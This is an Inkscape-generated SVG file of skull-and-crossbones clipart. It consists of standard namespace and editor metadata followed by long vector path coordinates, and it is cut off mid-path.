<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->

<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   version="1.1"
   id="svg4213"
   xml:space="preserve"
   width="800"
   height="800"
   viewBox="0 0 800 800"
   sodipodi:docname="skull-crossed-bones-clipart-pdv.svg"
   inkscape:version="0.92.4 (5da689c313, 2019-01-14)"><metadata
     id="metadata4219"><rdf:RDF><cc:Work
         rdf:about=""><dc:format>image/svg+xml</dc:format><dc:type
           rdf:resource="http://purl.org/dc/dcmitype/StillImage" /><dc:title></dc:title></cc:Work></rdf:RDF></metadata><defs
     id="defs4217"><clipPath
       clipPathUnits="userSpaceOnUse"
       id="clipPath4229"><path
         d="M 0,600 H 600 V 0 H 0 Z"
         id="path4227"
         inkscape:connector-curvature="0" /></clipPath></defs><sodipodi:namedview
     pagecolor="#ffffff"
     bordercolor="#666666"
     borderopacity="1"
     objecttolerance="10"
     gridtolerance="10"
     guidetolerance="10"
     inkscape:pageopacity="0"
     inkscape:pageshadow="2"
     inkscape:window-width="1920"
     inkscape:window-height="1018"
     id="namedview4215"
     showgrid="false"
     inkscape:zoom="0.295"
     inkscape:cx="400"
     inkscape:cy="400"
     inkscape:window-x="-8"
     inkscape:window-y="-8"
     inkscape:window-maximized="1"
     inkscape:current-layer="g4221" /><g
     id="g4221"
     inkscape:groupmode="layer"
     inkscape:label="skull-crossed-bones-clipart-pdv"
     transform="matrix(1.3333333,0,0,-1.3333333,0,800)"><g
       id="g4223"><g
         id="g4225"
         clip-path="url(#clipPath4229)"><path
           d="m 561.527,264.701 c -5.195,9.447 -11.769,14.924 -16.714,13.957 -14.274,-2.785 -29.344,-7.928 -35.624,-10.185 l -19.474,-11.18 -31.955,20.709 -0.035,-0.106 1.334,-25.724 c 2.634,-1.734 7.923,-5.121 14.093,-8.526 14.854,-8.195 12.059,-21.822 9.807,-32.771 -1.674,-8.156 -3.121,-15.199 1.271,-19.992 6.331,-6.904 29.807,-8.188 40.516,-2.217 6.227,3.473 6.201,6.309 6.152,12.523 -0.033,4.461 -0.078,10.157 2.668,16.948 -2.187,-0.098 -4.302,-0.184 -6.365,-0.373 -3.578,-0.313 -7.013,-0.967 -10.217,-2.373 -3.209,-1.377 -6.152,-3.498 -8.703,-6.145 -2.529,-2.676 -4.593,-5.836 -6.48,-9.133 1.217,3.584 2.65,7.164 4.752,10.483 2.117,3.285 4.892,6.306 8.281,8.623 3.373,2.349 7.27,3.908 11.098,5.006 3.834,1.121 7.644,1.871 11.048,2.843 l 0.331,-1.834 c 0.002,0 0.002,0.002 0.002,0.002 l -0.333,1.832 c 11.6,2.092 23.541,7.879 29.719,14.401 1.631,1.724 1.285,11.486 -5.172,23.232 m -67.486,-87.525 0.137,0.017 c -0.074,0.014 -0.147,0.028 -0.219,0.041 z m 21.473,-8.951 c -8.717,1.339 -22.43,1.855 -26.276,2.045 -5.769,0.285 -14.81,8.931 -18.656,13.355 -3.096,3.561 -3.955,13.941 -4.174,17.85 -0.332,-0.118 -0.644,-0.229 -0.937,-0.336 l -19.473,-11.178 -28.088,18.203 -1.912,-0.998 v -22.701 c 2.535,-1.686 7.451,-4.848 13.436,-8.151 14.855,-8.195 12.058,-21.822 9.806,-32.771 -1.674,-8.154 -3.121,-15.197 1.272,-19.99 6.33,-6.905 29.804,-8.19 40.515,-2.217 6.227,3.473 6.203,6.309 6.153,12.521 -0.034,4.459 -0.078,10.159 2.668,16.946 -2.188,-0.098 -4.303,-0.182 -6.366,-0.373 -3.578,-0.311 -7.013,-0.963 -10.216,-2.369 -3.209,-1.379 -6.149,-3.5 -8.703,-6.147 -2.53,-2.676 -4.594,-5.836 -6.479,-9.133 1.213,3.582 2.648,7.162 4.75,10.483 2.119,3.285 4.893,6.306 8.281,8.623 3.373,2.351 7.272,3.906 11.1,5.006 3.832,1.121 7.642,1.869 11.047,2.845 7.904,1.424 15.963,4.567 22.252,8.487 m -320.835,-62.33 c 4.015,5.115 2.035,12.027 -0.258,20.031 -3.078,10.744 -6.91,24.119 7.277,33.426 7.391,4.847 37.851,28.517 45.615,34.564 -0.472,4.897 -2.319,10.725 -4.842,12.977 -0.848,0.757 -1.447,0.816 -1.922,0.761 -2.44,-0.248 -5.051,0.285 -7.621,1.237 l -48.784,-37.2 -23.663,11.278 c -0.008,0.002 -0.014,0.004 -0.021,0.008 0.256,-7.448 0.534,-19.44 -0.236,-21.606 -1.132,-3.185 -10.666,-13.006 -21.349,-15.641 -5.653,-1.396 -14.296,-1.669 -21.184,-1.621 6.362,-3.117 14.122,-5.39 21.631,-6.158 3.47,-0.713 7.326,-1.17 11.232,-1.996 3.901,-0.803 7.907,-2.057 11.448,-4.142 3.557,-2.051 6.554,-4.852 8.918,-7.965 2.347,-3.151 4.05,-6.612 5.536,-10.092 -2.132,3.144 -4.432,6.139 -7.159,8.613 -2.746,2.444 -5.841,4.336 -9.145,5.463 -3.3,1.156 -6.777,1.547 -10.369,1.584 -2.07,0.033 -4.187,-0.045 -6.373,-0.113 3.257,-6.561 3.646,-12.244 3.951,-16.694 0.425,-6.199 0.619,-9.029 7.091,-12.015 11.134,-5.139 34.444,-2.067 40.227,5.301 m -92.232,55.855 c 11.133,-5.137 34.443,-2.062 40.226,5.303 4.016,5.115 2.036,12.027 -0.256,20.029 -3.08,10.746 -6.911,24.119 7.276,33.428 6.899,4.525 31.307,23.644 40.163,30.611 -1.699,2.397 -3.808,5.305 -5.997,8.322 -2.603,3.586 -5.34,7.364 -7.894,10.967 l -39.757,-30.316 c 0,0 -9.178,-4.11 -14.729,-1.465 -1.463,0.697 -2.966,1.537 -4.39,2.394 l -0.393,-0.287 -2.378,1.147 c -0.14,0.068 -14.899,7.01 -38.432,8.041 -5.632,0.236 -12.391,-6.873 -16.847,-17.711 -4.634,-11.274 -4.07,-19.549 -2.452,-21.016 6.655,-6.031 19.004,-10.888 30.73,-12.09 3.469,-0.711 7.325,-1.168 11.232,-1.994 3.901,-0.802 7.906,-2.056 11.448,-4.142 3.556,-2.053 6.553,-4.854 8.919,-7.967 2.346,-3.149 4.048,-6.609 5.534,-10.09 -2.132,3.145 -4.431,6.139 -7.158,8.613 -2.746,2.444 -5.842,4.334 -9.146,5.463 -3.301,1.156 -6.777,1.547 -10.369,1.584 -2.069,0.033 -4.187,-0.045 -6.373,-0.113 3.256,-6.561 3.646,-12.244 3.952,-16.693 0.424,-6.2 0.618,-9.03 7.091,-12.018 m -22.78,214.052 c 5.924,3.79 12.76,8.165 20.247,8.165 4.413,0 9.05,-1.518 13.863,-5.572 5.889,-4.96 33.127,-24.59 45.978,-33.81 0.397,6.867 1.44,14.762 3.662,22.986 l -42.838,31.176 2.818,18.101 c -6.104,-0.092 -14.163,-0.133 -18.838,0.17 -8.246,0.535 -19.344,10.941 -22.626,19.625 -2.677,7.083 -4.3,17.572 -5.159,24.67 -2.678,-8.093 -3.254,-19.291 -1.352,-29.275 0.31,-3.528 0.976,-7.353 1.303,-11.333 0.347,-3.967 0.291,-8.165 -0.694,-12.155 -0.947,-3.994 -2.774,-7.668 -5.081,-10.824 -2.346,-3.15 -5.174,-5.773 -8.084,-8.192 2.403,2.942 4.613,6.003 6.203,9.324 1.556,3.331 2.483,6.838 2.619,10.325 0.164,3.496 -0.458,6.938 -1.45,10.389 -0.56,1.994 -1.241,3.999 -1.933,6.075 -5.354,-4.996 -10.688,-6.997 -14.864,-8.564 -5.819,-2.18 -8.475,-3.176 -9.485,-10.233 -1.737,-12.138 7.878,-33.593 16.592,-37.027 6.049,-2.385 12.106,1.492 19.119,5.979 m -1.141,89.575 0.818,-1.165 c -0.093,0.556 -0.175,1.109 -0.248,1.657 -0.226,-0.167 -0.423,-0.331 -0.57,-0.492 m 25.74,-28.222 c 6.05,-2.385 12.107,1.492 19.119,5.979 5.924,3.791 12.761,8.165 20.247,8.165 4.413,0 9.051,-1.519 13.863,-5.573 5.861,-4.935 22.262,-16.741 29.948,-22.229 2.89,4.784 7.452,10.867 12.734,16.47 l -35.88,26.111 4.033,25.903 c 0.226,6.742 -0.146,18.473 -3.769,32.883 -1.373,5.456 -10.132,9.906 -21.791,11.074 -12.126,1.215 -19.899,-1.694 -20.841,-3.664 -3.875,-8.103 -4.996,-21.326 -2.789,-32.905 l -0.152,-0.028 c 0.347,-2.639 0.729,-5.372 0.962,-8.15 0.368,-4.271 0.397,-8.694 -0.364,-13.01 -0.742,-4.313 -2.323,-8.468 -4.627,-12.05 -2.292,-3.6 -5.226,-6.625 -8.374,-9.265 2.644,3.167 4.912,6.585 6.423,10.272 1.525,3.679 2.235,7.578 2.206,11.44 -0.018,3.871 -0.727,7.696 -1.755,11.5 -0.298,1.117 -0.631,2.232 -0.976,3.351 -5.506,-5.318 -11.027,-7.403 -15.323,-9.013 -5.82,-2.181 -8.474,-3.177 -9.485,-10.234 -1.737,-12.139 7.876,-33.594 16.591,-37.027 m 315.91,69.621 5.14,-21.865 -24.226,-20.637 c 5.383,-3.319 11.043,-7.721 16.351,-13.584 4.157,3.5 11.334,9.657 16.211,14.447 12.104,11.891 24.362,5.307 34.207,0.019 7.338,-3.94 13.672,-7.341 19.52,-4.503 8.428,4.089 16.375,26.215 13.717,38.186 -1.545,6.959 -4.27,7.749 -10.237,9.48 -4.283,1.242 -9.755,2.83 -15.474,7.403 -0.533,-2.122 -1.057,-4.173 -1.465,-6.204 -0.725,-3.517 -1.082,-6.997 -0.652,-10.469 0.402,-3.468 1.593,-6.893 3.398,-10.096 1.84,-3.19 4.279,-6.073 6.898,-8.823 -3.087,2.191 -6.105,4.588 -8.685,7.551 -2.543,2.971 -4.645,6.494 -5.893,10.405 -1.287,3.903 -1.664,8.083 -1.621,12.066 0.024,3.992 0.397,7.858 0.436,11.4 h 0.002 c 1.312,11.713 -0.813,24.812 -5.297,32.595 -1.182,2.057 -10.637,4.519 -23.736,1.694 -10.541,-2.274 -17.668,-6.992 -18.159,-12.022 -1.42,-14.489 -0.802,-30.382 -0.435,-37.043 m 97.572,-21.626 -6.832,-25.818 c 0,0 -4.939,-8.05 -19.207,-11.343 -10.412,-2.404 -16.961,0.597 -19.748,2.395 0.07,-1.883 0.15,-3.494 0.221,-4.771 l 5.14,-21.86 -22.113,-18.834 1.613,-2.067 0.239,-0.66 c 0.205,-0.571 3.867,-10.762 6.166,-19.458 6.693,6.261 17.546,16.447 22.431,21.245 12.106,11.891 24.36,5.306 34.207,0.019 7.336,-3.94 13.672,-7.339 19.52,-4.503 8.428,4.089 16.375,26.215 13.717,38.186 -1.545,6.959 -4.27,7.75 -10.237,9.48 -4.283,1.243 -9.756,2.83 -15.474,7.404 -0.534,-2.123 -1.059,-4.174 -1.465,-6.204 -0.725,-3.518 -1.082,-6.998 -0.653,-10.47 0.403,-3.468 1.594,-6.894 3.399,-10.096 1.84,-3.19 4.279,-6.072 6.898,-8.823 -3.088,2.191 -6.107,4.588 -8.685,7.551 -2.543,2.971 -4.645,6.494 -5.895,10.405 -1.285,3.903 -1.662,8.084 -1.619,12.066 0.024,3.993 0.397,7.858 0.436,11.4 h 0.002 c 0.937,8.362 0.113,17.42 -2.061,24.756 m -352.34,-110.884 0.056,-0.04 c 0.02,0.059 0.04,0.121 0.06,0.181 z M 397.617,151.385 c 2.342,2.746 3.139,7.404 1.551,9.062 -0.402,0.418 -0.734,0.475 -1.006,0.475 -0.525,0 -1.172,-0.266 -1.797,-0.524 -0.933,-0.382 -1.974,-0.757 -2.902,-0.544 -1.541,0.361 -2.381,-0.27 -3.717,-1.479 -0.617,-0.561 -1.32,-1.187 -2.195,-1.664 -0.067,-0.203 -0.133,-0.406 -0.196,-0.606 -0.392,-1.257 -0.693,-2.535 -0.896,-3.83 -0.207,-1.296 -0.301,-2.609 -0.15,-3.904 0.146,-1.291 0.513,-2.603 1.396,-3.723 -1.244,0.688 -2.24,1.887 -2.959,3.204 -0.74,1.324 -1.223,2.775 -1.574,4.234 -0.326,1.35 -0.549,2.725 -0.692,4.1 -0.347,0.046 -0.687,0.078 -1.017,0.078 -1.391,0 -2.432,-0.389 -3.436,-0.762 -0.838,-0.313 -1.623,-0.606 -2.48,-0.606 -0.277,0 -0.543,0.036 -0.807,0.096 -0.373,-1.031 -0.689,-2.082 -0.91,-3.148 -0.254,-1.215 -0.402,-2.461 -0.283,-3.69 0.113,-1.224 0.469,-2.474 1.303,-3.556 -1.19,0.648 -2.174,1.775 -2.868,3.054 -0.714,1.286 -1.146,2.702 -1.443,4.123 -0.258,1.213 -0.406,2.444 -0.488,3.674 -1.174,-0.885 -2.588,-1.845 -4.248,-1.845 -0.858,0 -1.69,0.261 -2.477,0.773 -0.676,0.439 -1.283,0.768 -1.857,1.041 -0.36,-1.078 -0.672,-2.168 -0.901,-3.275 -0.277,-1.315 -0.422,-2.647 -0.332,-3.971 0.092,-1.318 0.42,-2.676 1.328,-3.813 -1.269,0.705 -2.246,1.987 -2.912,3.364 -0.677,1.386 -1.105,2.892 -1.375,4.396 -0.216,1.164 -0.345,2.344 -0.431,3.524 -0.547,-0.196 -1.157,-0.387 -1.875,-0.387 -0.852,0 -1.725,0.267 -2.67,0.82 -1.315,0.768 -2.465,1.297 -3.481,1.608 -0.011,-0.038 -0.023,-0.077 -0.033,-0.114 -0.283,-1.154 -0.498,-2.332 -0.586,-3.513 -0.08,-1.178 -0.105,-2.395 0.135,-3.565 0.228,-1.172 0.66,-2.338 1.447,-3.383 -1.138,0.616 -2.148,1.588 -2.953,2.719 -0.824,1.135 -1.389,2.42 -1.883,3.729 -0.437,1.179 -0.748,2.394 -1.002,3.621 -0.424,-0.16 -0.875,-0.285 -1.388,-0.285 -1.116,0 -2.196,0.566 -3.502,1.839 -1.063,1.032 -2.301,1.666 -3.619,2.063 -0.067,-0.129 -0.149,-0.25 -0.211,-0.381 -0.397,-0.822 -0.711,-1.685 -0.911,-2.588 -0.177,-0.896 -0.224,-1.828 -0.08,-2.787 0.147,-0.963 0.579,-1.887 1.172,-2.795 -0.941,0.483 -1.908,1.141 -2.65,2.072 -0.742,0.92 -1.322,2.022 -1.719,3.192 -0.377,1.17 -0.601,2.394 -0.697,3.629 -0.008,0.097 0,0.197 -0.006,0.295 -0.51,0.009 -1.014,0.011 -1.51,0.011 -1.582,0.006 -3.076,0.008 -4.324,0.272 -1.902,0.398 -3.57,1.431 -5.182,2.428 -1.838,1.138 -3.736,2.312 -6.042,2.601 -1.505,0.184 -2.129,-1.59 -2.816,-4.006 -0.018,-0.054 -0.032,-0.107 -0.047,-0.162 1.219,-2.445 2.58,-4.861 4.019,-7.232 2.908,-4.774 6.166,-9.364 9.73,-13.705 3.578,-4.326 7.496,-8.399 11.906,-11.895 4.407,-3.431 9.414,-6.398 15.094,-7.256 -5.744,0.301 -11.199,2.828 -16.047,5.914 -4.863,3.145 -9.285,6.934 -13.386,11.02 -4.09,4.101 -7.893,8.492 -11.385,13.15 -1.742,2.334 -3.416,4.727 -4.983,7.233 -0.308,0.504 -0.615,1.013 -0.918,1.523 -9.632,8.088 -8.815,16.031 -8.311,20.906 0.171,1.651 0.332,3.211 -0.106,3.741 -0.168,0.205 -0.522,0.332 -1.049,0.377 -5.206,0.451 -9.474,1.464 -13.072,2.765 -0.004,-0.012 -0.007,-0.025 -0.01,-0.037 -0.378,-1.002 -0.697,-2.07 -1.151,-2.955 -1.688,-3.729 -3.7,-6.527 -4.852,-9.42 -1.197,-2.867 -1.589,-6.043 -1.148,-9.418 0.355,-3.392 1.664,-6.724 2.968,-10.06 -2.163,2.83 -4.428,5.728 -5.873,9.242 -0.452,0.838 -0.668,1.779 -0.99,2.697 -0.348,0.914 -0.497,1.887 -0.673,2.871 -0.364,1.967 -0.343,4.027 -0.162,6.043 0.424,4.053 1.694,7.641 2.074,10.701 0.158,0.785 0.114,1.481 0.183,2.198 0.016,0.705 -0.083,1.363 -0.1,2.021 l -0.275,1.33 c -1.709,1.19 -3.202,2.379 -4.563,3.467 -2.979,2.381 -5.132,4.099 -7.472,4.099 -0.524,0 -1.047,-0.085 -1.601,-0.257 -0.558,-0.619 0.217,-4.764 0.781,-7.791 1.262,-6.772 2.835,-15.198 -0.206,-20.996 -3.625,-6.911 -1.24,-22.204 2.137,-29.141 1.042,-2.139 1.95,-2.998 2.411,-3.082 4.947,-0.91 49.244,-24.463 57.666,-33.055 6.291,-6.418 18.756,-9.289 28.316,-9.289 3.131,0 6.031,0.311 8.381,0.903 3.199,0.802 5.947,1.634 8.609,2.437 5.784,1.748 10.731,3.24 16.602,3.125 l 0.492,-0.004 c 3.973,0 6.721,1 8.399,3.059 2.207,2.703 2.638,7.416 1.287,14.006 -1.946,9.474 -1.791,22.22 4.482,29.574 m -206.606,259.169 -0.115,-0.274 -0.037,0.026 c -4.68,-7.896 -8.551,-16.419 -11.53,-25.519 l 0.247,-0.186 -0.788,-1.578 c -0.355,-1.137 -0.72,-2.268 -1.048,-3.422 -17.955,-63.295 2.572,-120.923 56.317,-158.107 0.706,-0.488 1.356,-0.726 1.987,-0.726 1.89,0 3.856,2.211 6.132,4.773 3.803,4.279 8.537,9.605 16.695,9.605 0.724,0 1.473,-0.042 2.224,-0.128 7.1,-0.819 8.301,-1.348 8.512,-2.627 0.215,-1.311 -1.138,-1.948 -3.378,-3.004 -3.107,-1.465 -7.802,-3.676 -7.934,-7.364 -0.12,-3.337 3.46,-9.41 21.192,-19.377 9.506,-5.343 18.006,-8.052 25.263,-8.052 16.049,0 23.385,13.244 28.24,22.008 2.694,4.865 4.641,8.38 7.33,8.38 0.944,0 1.866,-0.449 2.743,-1.336 l 0.193,-0.199 0.08,-0.267 c 2.193,-7.578 -10.971,-27.467 -31.389,-38.125 0.913,-3.096 1.18,-5.723 1.401,-7.869 0.436,-4.295 0.657,-5.309 3.773,-5.309 0.307,0 0.635,0.014 0.99,0.039 0.301,0.022 0.604,0.012 0.907,0.014 0.013,1.258 0.107,2.638 0.496,3.953 0.404,1.412 1.111,2.629 1.908,3.646 0.803,1.024 1.691,1.901 2.598,2.737 -0.456,-1.147 -0.864,-2.305 -1.114,-3.45 -0.252,-1.144 -0.302,-2.25 -0.113,-3.24 0.178,-0.992 0.57,-1.916 1.061,-2.939 l 0.794,-1.596 c 1.965,-0.582 3.836,-1.352 5.493,-2.037 0.125,-0.053 0.246,-0.102 0.369,-0.154 0.119,0.615 0.238,1.23 0.385,1.839 0.429,1.737 0.984,3.434 1.689,5.063 0.697,1.627 1.557,3.186 2.611,4.58 1.049,1.395 2.28,2.619 3.643,3.584 -1.957,-2.732 -2.848,-5.867 -3.068,-8.992 -0.118,-1.561 -0.092,-3.125 0.044,-4.67 0.088,-0.969 0.237,-1.932 0.411,-2.875 0.134,0.059 0.222,0.131 0.287,0.199 0.576,0.617 1.363,0.93 2.34,0.93 1.494,0 3.289,-0.735 5.214,-1.651 0.176,1.393 0.43,2.756 0.774,4.092 0.488,1.887 1.125,3.723 1.953,5.455 0.824,1.729 1.838,3.366 3.102,4.733 -0.807,-1.678 -1.266,-3.451 -1.532,-5.223 -0.261,-1.773 -0.328,-3.56 -0.25,-5.322 0.078,-1.76 0.321,-3.506 0.701,-5.16 0.071,-0.309 0.155,-0.606 0.237,-0.905 0.844,-0.326 1.601,-0.541 2.185,-0.541 0.278,0 0.485,0.051 0.614,0.153 0.679,0.535 1.527,0.808 2.517,0.808 0.885,0 1.83,-0.222 2.781,-0.508 0.024,0.229 0.045,0.456 0.067,0.686 0.178,1.664 0.408,3.359 0.785,5.027 0.377,1.67 0.896,3.319 1.641,4.846 0.74,1.527 1.714,2.922 2.892,4.035 -1.482,-2.916 -1.609,-6.072 -1.246,-9.078 0.184,-1.516 0.496,-3.017 0.859,-4.537 0.19,-0.789 0.395,-1.576 0.6,-2.389 0.592,0.018 1.07,0.147 1.473,0.434 0.892,0.633 1.963,0.955 3.179,0.955 0.983,0 1.971,-0.207 2.909,-0.492 0.068,0.445 0.144,0.881 0.228,1.314 0.317,1.631 0.721,3.19 1.153,4.725 0.871,3.06 1.849,6.023 2.757,9.027 0.184,-3.129 0.287,-6.283 0.518,-9.365 0.119,-1.537 0.273,-3.059 0.508,-4.516 0.131,-0.797 0.293,-1.576 0.484,-2.314 0.441,0.092 0.945,0.178 1.545,0.277 1.172,0.194 2.588,0.432 3.896,0.83 0.526,0.795 0.977,1.725 1.327,2.748 0.5,1.455 0.81,3.071 0.982,4.731 0.336,3.334 0.149,6.84 -0.285,10.326 1.482,-3.188 2.785,-6.514 3.57,-10.123 0.354,-1.652 0.584,-3.373 0.606,-5.172 0.818,0.09 1.656,0.107 2.457,0.107 l 1.736,-0.009 c 0.686,0 1.357,0.017 1.963,0.082 0.512,0.197 1.273,1.047 1.693,2.152 0.534,1.279 0.832,2.83 0.953,4.43 0.256,3.222 -0.203,6.642 -0.892,10.01 1.707,-2.987 3.279,-6.135 4.17,-9.698 0.387,-1.564 0.64,-3.213 0.619,-4.984 1.225,-0.065 2.643,-0.018 4.441,2.041 2.836,3.252 1.59,12.607 0.922,17.635 -0.16,1.193 -0.297,2.222 -0.351,2.953 -0.065,0.812 -0.45,1.949 -0.895,3.267 -1.465,4.317 -3.674,10.84 1.889,17.282 1.547,1.791 2.758,3.498 3.931,5.148 4.344,6.115 7.655,10.838 22.116,10.156 14.812,-0.738 15.521,14.803 16.05,26.063 0.053,1.156 0.106,2.25 0.17,3.252 0.2,3.066 -0.408,7.49 -1.048,12.172 -1.555,11.332 -3.489,25.437 4.343,31.688 2.373,1.893 4.356,3.679 6.016,5.394 l 0.646,1.89 0.686,-0.457 c 8.777,9.94 6.377,17.621 2.551,29.799 -2.473,7.87 -5.549,17.665 -6.5,30.93 -1.367,19.025 -14.032,42.995 -33.049,62.553 -22.801,23.447 -52.611,38.549 -83.94,42.527 -8.048,1.022 -16.164,1.54 -24.116,1.54 -33.657,0 -63.516,-9.013 -87.062,-25.276 l 0.392,-0.297 -2.548,-1.253 c -13.731,-9.912 -25.222,-22.344 -33.928,-36.957 M 573.074,235.432 c -6.347,-6.7 -17.072,-12.518 -28.426,-15.614 -1.392,-3.289 -2.863,-6.537 -4.386,-9.754 -0.621,-3.13 -0.604,-5.992 -0.582,-8.804 0.049,-5.951 0.093,-12.612 -7.512,-18.24 0.959,-6.09 0.346,-11.586 -2.813,-14.92 -5.916,-6.246 -15.644,-11.725 -26.136,-14.948 -1.772,-2.056 -3.58,-4.08 -5.418,-6.078 -1.903,-4.928 -1.873,-9.088 -1.84,-13.146 0.053,-6.682 0.113,-14.254 -10.656,-20.26 -5.75,-3.207 -14.375,-4.897 -23.082,-4.897 -2.703,0 -5.412,0.167 -8.051,0.499 C 413.51,81.432 364.32,65.139 311.321,65.139 c -42.607,0 -82.747,10.539 -117.982,29.129 -6.783,-3.289 -15.766,-4.963 -24.269,-4.963 -6.908,0 -13.491,1.099 -18.297,3.316 -11.197,5.168 -11.715,12.723 -12.171,19.387 -0.372,5.418 -0.756,11.015 -5.904,18.033 -11.725,2.176 -23.072,7.211 -30.002,13.492 -2.639,2.393 -3.815,6.076 -4.025,10.293 -11.101,5.166 -11.62,12.695 -12.075,19.342 -0.372,5.418 -0.756,11.014 -5.903,18.031 -11.725,2.176 -23.073,7.211 -30.002,13.492 -6.699,6.071 -4.064,20.418 0.227,30.86 3.908,9.506 9.18,16.461 15.007,20.152 -5.1,20.037 -7.817,41.026 -7.817,62.649 0,14.367 1.215,28.45 3.514,42.163 -1.407,0.208 -2.835,0.565 -4.292,1.139 -13.483,5.311 -24.203,31.498 -22.065,46.441 1.747,12.207 8.839,14.865 15.094,17.211 5.085,1.906 10.338,3.875 15.59,10.816 -1.272,11.856 0.306,24.17 4.342,32.608 1.536,3.215 4.731,5.396 8.712,6.804 1.774,12.111 8.837,14.765 15.074,17.104 5.085,1.905 10.339,3.876 15.59,10.815 -1.271,11.857 0.307,24.171 4.341,32.608 3.9,8.158 18.401,9.74 29.637,8.614 14.392,-1.442 24.703,-6.911 28.399,-14.843 39.958,26.37 87.82,41.733 139.277,41.733 36.361,0 70.921,-7.678 102.173,-21.478 3.379,6.62 11.684,11.804 23.424,14.336 12.771,2.754 28.603,2.084 33.199,-5.895 4.666,-8.104 7.18,-20.262 6.817,-32.182 5.765,-6.52 11.154,-8.082 16.371,-9.595 5.713,-1.656 12.095,-3.529 15.316,-12.414 6.115,-0.824 11.209,-2.985 13.502,-6.968 4.666,-8.103 7.182,-20.261 6.816,-32.181 5.766,-6.52 11.157,-8.081 16.372,-9.595 6.416,-1.86 13.689,-3.97 16.363,-16.008 2.517,-11.334 -2.049,-29.871 -10.221,-40.708 8.481,-25.298 13.082,-52.373 13.082,-80.525 0,-13.179 -1.008,-26.122 -2.949,-38.756 2.727,-2.858 5.307,-6.43 7.635,-10.664 6.295,-11.448 10.183,-26.813 3.853,-33.5 m -386.82,90.387 c -0.12,-9.307 1.589,-18.519 4.246,-27.348 2.717,-8.828 6.379,-17.344 11.011,-25.401 1.158,-2.015 2.371,-4.007 3.651,-5.972 1.3,-1.95 2.669,-3.869 4.122,-5.756 1.458,-1.885 2.983,-3.748 4.685,-5.541 0.42,-0.449 0.865,-0.891 1.306,-1.332 l 0.68,-0.658 0.343,-0.327 0.413,-0.371 c 1.114,-1 2.294,-1.879 3.503,-2.648 4.869,-3.092 10.06,-4.43 15.038,-5.17 5.006,-0.707 9.926,-0.615 14.759,-0.139 2.415,0.28 4.81,0.676 7.189,1.203 2.381,0.524 4.744,1.182 7.093,2.055 2.354,0.881 4.695,1.879 7.089,3.385 1.189,0.765 2.405,1.654 3.64,2.937 0.616,0.66 1.248,1.43 1.813,2.452 0.142,0.244 0.276,0.517 0.402,0.814 l 0.181,0.432 0.084,0.255 0.328,1.026 c 0.819,2.736 1.004,5.344 1.084,7.783 0.065,2.447 -0.045,4.744 -0.185,6.977 -0.262,4.453 -0.572,8.658 -0.296,12.798 0.246,4.133 1.084,8.198 2.743,12.093 1.664,3.884 4.104,7.558 7.025,10.972 -1.918,-1.166 -3.751,-2.504 -5.485,-4.011 -1.699,-1.535 -3.297,-3.237 -4.697,-5.127 -2.827,-3.768 -4.777,-8.276 -5.942,-12.886 -1.167,-4.619 -1.596,-9.314 -1.968,-13.718 -0.208,-2.2 -0.375,-4.338 -0.683,-6.311 -0.306,-1.969 -0.751,-3.787 -1.369,-5.252 l -0.241,-0.537 -0.059,-0.135 c -0.003,0.012 10e-4,0.039 0.005,0.057 0.016,0.043 0.024,0.07 0.015,0.08 0.003,0.066 -0.085,-0.018 -0.253,-0.141 -0.36,-0.261 -0.978,-0.644 -1.706,-0.986 -1.446,-0.719 -3.256,-1.348 -5.112,-1.844 -3.748,-0.972 -7.775,-1.615 -11.773,-1.808 -3.996,-0.268 -8.002,-0.076 -11.773,0.492 -3.759,0.58 -7.284,1.723 -9.961,3.35 -0.664,0.412 -1.272,0.855 -1.816,1.328 l -0.209,0.179 -0.26,0.245 -0.52,0.492 -1.034,1.031 c -1.376,1.398 -2.735,2.906 -4.038,4.49 -1.305,1.584 -2.569,3.233 -3.786,4.932 -1.236,1.685 -2.43,3.418 -3.581,5.187 -4.583,7.09 -8.673,14.619 -12.024,22.453 -3.364,7.825 -6.093,15.961 -7.504,24.361 -1.388,8.372 -1.452,17.123 1.682,25.564 -2.765,-3.538 -4.753,-7.786 -5.987,-12.241 -1.26,-4.461 -1.795,-9.123 -1.868,-13.763 m 118.602,-71.368 c 4.624,-3.57 10.773,-5.383 18.271,-5.383 15.221,0 32.822,7.602 39.678,13.088 7.779,6.231 7.896,20.91 7.968,29.684 0.012,1.734 0.024,3.234 0.096,4.332 0.281,4.33 -1.062,8.213 -3.89,11.229 -4.051,4.322 -10.958,6.702 -19.444,6.702 -10.666,0 -23.256,-3.773 -35.45,-10.627 -9.309,-5.23 -14.789,-11.996 -16.288,-20.109 -2.698,-14.607 8.412,-28.178 8.885,-28.748 z m 82.658,-48.793 c 0.783,-0.203 1.554,-0.306 2.291,-0.306 4.627,0 8.134,3.865 10.728,11.818 1.582,4.848 0.949,10.486 0.334,15.941 -0.4,3.547 -0.81,7.215 -0.594,10.561 0.362,5.557 -1.894,13.373 -4.732,16.4 -0.801,0.858 -1.633,1.291 -2.471,1.291 -0.879,0 -2.109,-0.482 -2.965,-2.783 l -0.05,-0.191 c -0.024,-0.125 -2.256,-12.678 -3.776,-25.248 -3.183,-26.325 -0.199,-27.106 1.235,-27.483 m -25.03,29.115 c -1.259,-16.496 -1.396,-22.304 4.455,-24.322 3.678,-1.267 6.479,-2.681 8.524,-3.713 2.191,-1.105 3.637,-1.836 4.912,-1.836 2.473,0 3.148,2.612 3.59,5.061 0.467,2.603 0.308,6.15 0.107,10.642 -0.437,9.706 -1.033,23 4.258,37.463 l 1.025,2.795 -2.593,-1.463 c -1.774,-1 -3.666,-1.884 -5.672,-2.824 -8.235,-3.855 -17.569,-8.224 -18.606,-21.803 m 41.465,27.665 c -5.881,10.81 -4.349,26.148 -2.004,33.277 5.108,15.522 32.508,20.343 41.909,20.343 0.207,0 0.398,-0.002 0.58,-0.007 4.738,-0.131 8.689,-2.472 9.611,-5.694 0.461,-1.61 0.514,-4.789 -4.295,-7.973 -7.168,-4.743 -7.305,-25.894 -5.137,-33.409 0.825,-2.868 -0.136,-6.514 -2.574,-9.752 -3.879,-5.155 -10.275,-8.112 -17.549,-8.112 -2.498,0 -5.103,0.352 